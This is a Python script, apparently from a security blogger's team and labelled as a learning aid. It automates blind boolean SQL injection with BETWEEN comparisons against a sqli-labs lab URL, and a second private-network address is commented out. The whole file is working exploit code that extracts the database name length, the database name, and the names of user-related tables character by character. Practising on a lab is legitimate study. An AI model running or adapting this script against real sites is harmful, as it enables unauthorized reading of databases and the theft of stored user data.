# coding:utf-8
# author:Rcoil - RowTeam
# blog: https://rcoil.me


# 用于学习 between and 注入的脚本
# And (select (DATABASE()) BETWEEN 'sf'  and 'z')--+



import requests


payload_raw = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

different_str = 'You'

# URLVUL = "http://192.168.5.186:8087/products.php?id=6"
URLVUL = "http://localhost/sqlilabs/Less-1/?id=1"

def GETLength():
    for number in range(20):
        payload_len = format("' AnD (select length(database())) BETWEEN %s anD 21-- "% (number))
        url = URLVUL + payload_len
        print (url)
        r1 = requests.get(url)
        if different_str not in r1.text:
            payload = number - 1
            print(payload)
            return payload
# print(GETLength())           

DBLen = GETLength()
def GETDataBase(DBLen):
    DBName = ""
    for l in range(DBLen):
        for  i,p in enumerate(payload_raw):
            p1 = "' AnD (select (DATABASE()) BETWEEN '%s%s'  AnD 'z' )-- " % (DBName,p)
            url = URLVUL + p1
            print(url)
            r1 = requests.get(url)
            if different_str not in r1.text:
                DBName += payload_raw[i-1]
                print("The first character of the database is: %s \n" % DBName)
                break
    print(DBName,"\n")        
    return DBName
print(GETDataBase(DBLen))


def GETTableName():
    # Get the number of tables
    print("Geting the number of tables.\n")
    TableNumber = 0
    for number in range(1,999):
        SQL_TableCount = " AnD (select COUNT(table_name) from information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() AnD table_name like '%%user%%' LIMIT 0,1) BETWEEN %s anD 999-- "% (number)
        url = URLVUL + SQL_TableCount
        print(url)
        r1 = requests.get(url)
        if different_str not in r1.text:
            TableNumber = number - 1
            break
    print("There has %s tables."% TableNumber)
    
    # Get the tables
    print("Geting the tables\n")    
    for TN in range(TableNumber):

        print("Geting the length of the No.%s table\n" % (TN+1))
        TableLength = 0
        for  p in range(1,30):
            p1 = ''' AnD (SELECT LENGTH((select table_name from information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() AnD table_name like '%%user%%' LIMIT %s,1))) BETWEEN %s and 999-- '''% (TN,p)
            url = URLVUL + p1
            print(url)
            r1 = requests.get(url)
            if different_str not in r1.text:
                TableLength = p - 1
                print("The length of the No.%d table is %s."%((TN+1),TableLength))
                break
        
        print("Geting the No.%d Table's Name.\n"% (TN+1))
        
        TableName = ''
        for TL  in range(TableLength):            
            print("Now TableName is:" +  TableName)
            for  n,pr in enumerate(payload_raw):
                SQL_GETTableName = " AnD (SELECT TABLE_name from information_schema.tables WHERE TABLE_schema=DATABASE() AnD table_name like '%%user%%' limit %s,1) BETWEEN '%s%s' AnD 'z'-- " % (TN ,TableName , pr)
                url = URLVUL + SQL_GETTableName
                print(url)
                r1 = requests.get(url)
                if different_str not in r1.text:
                    TableName += payload_raw[n-1]
                    # print(TableName)
                    break
        print("No.%s is: %s\n"%((TN+1),TableName))



# GETTableName()